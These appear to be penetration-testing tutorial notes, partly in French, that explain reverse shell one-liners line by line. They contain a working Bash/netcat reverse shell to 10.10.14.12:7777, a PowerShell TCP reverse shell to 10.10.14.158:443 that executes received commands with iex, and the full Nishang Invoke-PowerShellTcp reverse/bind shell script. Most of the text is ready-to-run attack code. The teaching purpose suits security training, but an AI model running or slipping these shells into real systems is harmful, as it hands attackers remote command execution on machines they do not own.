# Introduction to Payloads

***

### <mark style="color:red;">One-Liners Examined</mark>

#### <mark style="color:green;">**Netcat/Bash Reverse Shell One-liner**</mark>

{% code fullWidth="true" %}
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```
{% endcode %}

<mark style="color:orange;">**Remove /tmp/f**</mark>

{% code fullWidth="true" %}
```bash
rm -f /tmp/f; 
```
{% endcode %}

Removes the `/tmp/f` file if it exists, `-f` causes `rm` to ignore nonexistent files. The semi-colon (`;`) is used to execute the command sequentially.

<mark style="color:orange;">**Make A Named Pipe**</mark>

```bash
mkfifo /tmp/f; 
```

Makes a [FIFO named pipe file](https://man7.org/linux/man-pages/man7/fifo.7.html) at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (`;`) is used to execute the command sequentially.

<mark style="color:orange;">**Output Redirection**</mark>

```bash
cat /tmp/f | 
```

Concatenates the FIFO named pipe file /tmp/f, the pipe (`|`) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (`|`).

<mark style="color:orange;">**Set Shell Options**</mark>

```bash
/bin/bash -i 2>&1 | 
```

Specifies the command language interpreter using the `-i` option to ensure the shell is interactive. `2>&1` ensures the standard error data stream (`2`) `&` standard output data stream (`1`) are redirected to the command following the pipe (`|`).

<mark style="color:orange;">**Open a Connection with Netcat**</mark>

```bash
nc 10.10.14.12 7777 > /tmp/f  
```

Uses Netcat to send a connection to our attack host `10.10.14.12` listening on port `7777`. The output will be redirected (`>`) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed

***

### <mark style="color:red;">PowerShell One-liner Explained</mark>

#### <mark style="color:green;">**Powershell One-liner**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
{% endcode %}

<mark style="color:orange;">**Calling PowerShell**</mark>

```powershell
powershell -nop -c 
```

* Lance `powershell.exe` sans charger de profil (`-NoProfile`) et exécute le bloc de commande/script donné avec `-c` (ou `-Command`).
* La commande est appelée depuis `cmd.exe`, d’où la présence de `powershell` au début.
* Utile quand on trouve une vulnérabilité d’exécution distante (RCE) qui permet d’exécuter des instructions directement dans `cmd.exe`.

<mark style="color:orange;">**Binding A Socket**</mark>

```powershell
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
```

* Affecte la variable `$client` à l’objet créé par `New-Object`, ici une instance de `System.Net.Sockets.TCPClient`.
* Cet objet .NET ouvre un socket TCP vers l’adresse et le port donnés (`10.10.14.158,443`).
* La connexion se fait au niveau réseau (socket) — utile pour envoyer/recevoir des flux via TCP.
* Le point-virgule (`;`) sépare les instructions pour qu’elles s’exécutent l’une après l’autre.

<mark style="color:orange;">**Setting The Command Stream**</mark>

```powershell
$stream = $client.GetStream();
```

* Affecte la variable `$stream` au résultat de `$client.GetStream()`, donc la **NetworkStream** associée au `TCPClient`.
* Cette NetworkStream représente le flux réseau bidirectionnel lié à la connexion TCP ouverte (permet de lire et d’écrire des octets).
* Elle sert d’abstraction pour envoyer/recevoir des données via le socket sans manipuler directement les primitives basses-niveaux.
* Le point-virgule (`;`) sépare les instructions pour qu’elles s’exécutent séquentiellement.

<mark style="color:orange;">**Empty Byte Stream**</mark>

```powershell
[byte[]]$bytes = 0..65535|%{0}; 
```

Creates a byte type array (`[]`) called `$bytes` that returns 65,535 zeros as the values in the array.&#x20;

<mark style="color:orange;">**Stream Parameters**</mark>

```powershell
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```

* Affecte `$i` au résultat de `$stream.Read($bytes, 0, $bytes.Length)`, c’est‑à‑dire le nombre d’octets effectivement lus dans le tampon `$bytes`.
* `Read` lit des octets depuis la `NetworkStream` en commençant à l’`offset` 0 et au plus `count` octets (`$bytes.Length`).
* Placée dans une boucle `while`, l’affectation est évaluée : la boucle continue tant que `Read` retourne une valeur non nulle (des octets reçus).
* Quand `Read` retourne 0, cela signifie généralement que la connexion a été fermée et la boucle se termine.

<mark style="color:orange;">**Set The Byte Encoding**</mark>

```powershell
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```

* Affecte `$data` à une instance de la classe .NET `System.Text.ASCIIEncoding`.
* Permet d’utiliser la méthode `GetString` pour convertir le flux d’octets `$bytes` en texte ASCII lisible.
* Assure que les données transmises et reçues ne sont pas juste des bits bruts, mais sont encodées en texte.
* Le point-virgule (`;`) sépare les instructions pour qu’elles s’exécutent séquentiellement.

<mark style="color:orange;">**Invoke-Expression**</mark>

```powershell
$sendback = (iex $data 2>&1 | Out-String ); 
```

* Affecte `$sendback` au résultat de `Invoke-Expression ($data)`, qui exécute le contenu de `$data` comme commande PowerShell sur l’ordinateur local.
* Redirige la **sortie standard** (`1`) et **l’erreur** (`2>`) vers `Out-String`, qui convertit tout en texte.
* Permet de capturer à la fois les résultats et les erreurs d’exécution dans une seule chaîne.
* Le point-virgule (`;`) sépare les instructions pour qu’elles s’exécutent séquentiellement.

<mark style="color:orange;">**Show Working Directory**</mark>

```powershell
$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
```

<mark style="color:orange;">**Sets Sendbyte**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```
{% endcode %}

Sets/evaluates the variable `$sendbyte` equal to (`=`) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.

<mark style="color:orange;">**Terminate TCP Connection**</mark>

```powershell
$client.Close()"
```

This is the [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0) method that will be used when the connection is terminated.

The one-liner we just examined together can also be executed in the form of a PowerShell script (`.ps1`). We can see an example of this by viewing the source code below. This source code is part of the [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) project:

{% code fullWidth="true" %}
```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
```
{% endcode %}
